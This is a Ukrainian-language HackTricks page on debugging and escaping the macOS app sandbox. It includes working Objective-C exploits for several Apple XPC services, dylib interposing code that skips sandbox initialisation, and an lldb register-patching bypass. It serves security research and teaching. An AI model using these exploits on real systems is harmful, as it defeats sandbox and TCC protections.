# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Зображення з <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

На попередньому зображенні можна спостерігати **як буде завантажено пісочницю** при запуску програми з правом **`com.apple.security.app-sandbox`**.

Компилятор зв'яже `/usr/lib/libSystem.B.dylib` з бінарним файлом.

Потім **`libSystem.B`** буде викликати кілька інших функцій, поки **`xpc_pipe_routine`** не надішле права програми до **`securityd`**. Securityd перевіряє, чи процес має бути в карантині всередині пісочниці, і якщо так, то він буде в карантині.\
Нарешті, пісочниця буде активована за допомогою виклику **`__sandbox_ms`**, який викликатиме **`__mac_syscall`**.

## Можливі обходи

### Обхід атрибута карантину

**Файли, створені пісочними процесами**, отримують **атрибут карантину**, щоб запобігти втечі з пісочниці. Однак, якщо вам вдасться **створити папку `.app` без атрибута карантину** всередині пісочниці, ви зможете зробити так, щоб бінарний файл пакету програми вказував на **`/bin/bash`** і додати деякі змінні середовища в **plist**, щоб зловживати **`open`** для **запуску нової програми без пісочниці**.

Це було зроблено в [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Отже, на даний момент, якщо ви просто здатні створити папку з назвою, що закінчується на **`.app`** без атрибута карантину, ви можете втекти з пісочниці, оскільки macOS лише **перевіряє** атрибут **карантину** в **папці `.app`** та в **основному виконуваному файлі** (і ми вкажемо основний виконуваний файл на **`/bin/bash`**).
>
> Зверніть увагу, що якщо пакет .app вже був авторизований для запуску (він має атрибут карантину з прапором авторизації на запуск), ви також можете зловживати ним... за винятком того, що тепер ви не можете записувати всередині **пакетів .app**, якщо у вас немає деяких привілейованих дозволів TCC (яких у вас не буде всередині пісочниці).

### Зловживання функціональністю Open

У [**останніх прикладах обходу пісочниці Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) можна побачити, як функціональність cli **`open`** може бути зловжита для обходу пісочниці.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Запуск агентів/демонів

Навіть якщо програма **призначена для роботи в пісочниці** (`com.apple.security.app-sandbox`), можливо обійти пісочницю, якщо її **виконати з LaunchAgent** (`~/Library/LaunchAgents`), наприклад.\
Як пояснено в [**цьому пості**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), якщо ви хочете отримати стійкість з програмою, яка є пісочною, ви можете зробити так, щоб вона автоматично виконувалася як LaunchAgent і, можливо, інжектувати шкідливий код через змінні середовища DyLib.

### Зловживання місцями автозапуску

Якщо пісочний процес може **записувати** в місце, де **пізніше буде запущено бінарний файл без пісочниці**, він зможе **втекти, просто помістивши** туди бінарний файл. Гарним прикладом таких місць є `~/Library/LaunchAgents` або `/System/Library/LaunchDaemons`.

Для цього вам може знадобитися навіть **2 кроки**: Зробити процес з **більш ліберальною пісочницею** (`file-read*`, `file-write*`), щоб виконати ваш код, який насправді запише в місце, де він буде **виконаний без пісочниці**.

Перевірте цю сторінку про **місця автозапуску**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Зловживання іншими процесами

Якщо з пісочного процесу ви зможете **компрометувати інші процеси**, що працюють в менш обмежених пісочницях (або без них), ви зможете втекти в їх пісочниці:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Доступні системні та користувацькі служби Mach

Пісочниця також дозволяє спілкуватися з певними **службами Mach** через XPC, визначеними в профілі `application.sb`. Якщо вам вдасться **зловживати** однією з цих служб, ви можете бути в змозі **втекти з пісочниці**.

Як зазначено в [цьому звіті](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), інформація про служби Mach зберігається в `/System/Library/xpc/launchd.plist`. Можливо знайти всі системні та користувацькі служби Mach, шукаючи в цьому файлі `<string>System</string>` та `<string>User</string>`.

Більше того, можливо перевірити, чи доступна служба Mach для пісочної програми, викликавши `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Доступні PID Mach сервіси

Ці Mach сервіси спочатку були зловжиті для [виходу з пісочниці в цьому звіті](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). На той час **всі XPC сервіси, які вимагалися** додатком та його фреймворком, були видимі в домені PID додатка (це Mach сервіси з `ServiceType` як `Application`).

Щоб **зв'язатися з XPC сервісом домену PID**, потрібно просто зареєструвати його всередині додатка з рядком, таким як:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Крім того, можна знайти всі **Application** Mach сервіси, шукаючи в `System/Library/xpc/launchd.plist` за `<string>Application</string>`.

Інший спосіб знайти дійсні xpc сервіси - перевірити ті, що знаходяться в:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Кілька прикладів зловживання цією технікою можна знайти в [**оригінальному описі**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), однак нижче наведені деякі узагальнені приклади.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ця служба дозволяє кожному XPC з'єднанню, завжди повертаючи `YES`, а метод `runTask:arguments:withReply:` виконує довільну команду з довільними параметрами.

Експлуатація була "такою ж простою, як":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ця XPC служба дозволяла кожному клієнту завжди повертати YES, а метод `createZipAtPath:hourThreshold:withReply:` в основному дозволяв вказати шлях до папки для стиснення, і він стисне її у ZIP файл.

Отже, можливо створити фальшиву структуру папок додатка, стиснути її, а потім розпакувати та виконати, щоб вийти з пісочниці, оскільки нові файли не матимуть атрибута карантину.

Експлойт був:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ця XPC служба дозволяє надати доступ на читання та запис до довільного URL для XPC клієнта через метод `extendAccessToURL:completion:`, який приймав будь-яке з'єднання. Оскільки XPC служба має FDA, можливо зловживати цими дозволами, щоб повністю обійти TCC.

Експлойт був:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Статичне компілювання та динамічне зв'язування

[**Це дослідження**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) виявило 2 способи обійти Sandbox. Оскільки sandbox застосовується з userland, коли бібліотека **libSystem** завантажується. Якщо бінарний файл міг уникнути його завантаження, він ніколи не потрапив би під sandbox:

- Якщо бінарний файл був **повністю статично скомпільований**, він міг би уникнути завантаження цієї бібліотеки.
- Якщо **бінарний файл не потребував би завантаження жодних бібліотек** (оскільки лінкер також знаходиться в libSystem), йому не потрібно буде завантажувати libSystem.

### Shellcodes

Зверніть увагу, що **навіть shellcodes** в ARM64 потрібно зв'язувати в `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Не успадковані обмеження

Як пояснено в **[бонусі цього звіту](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, обмеження пісочниці, такі як:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
може бути обійдено новим процесом, що виконується, наприклад:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Однак, звичайно, цей новий процес не успадкує права або привілеї від батьківського процесу.

### Права

Зверніть увагу, що навіть якщо деякі **дії** можуть бути **дозволені пісочницею**, якщо додаток має конкретне **право**, як у:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Для отримання додаткової інформації про **Interposting** перегляньте:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Інтерпост `_libsecinit_initializer`, щоб запобігти пісочниці
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Інтерпост `__mac_syscall` для запобігання пісочниці
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Налагодження та обхід пісочниці з lldb

Давайте скомпілюємо додаток, який повинен бути в пісочниці:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Тоді скомпілюйте додаток:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Додаток спробує **прочитати** файл **`~/Desktop/del.txt`**, що **Sandbox не дозволить**.\
> Створіть файл там, оскільки після обходу Sandbox він зможе його прочитати:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Давайте відлагодимо додаток, щоб побачити, коли завантажується Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Навіть з обхідним шляхом Sandbox TCC** запитає у користувача, чи хоче він дозволити процесу читати файли з робочого столу

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
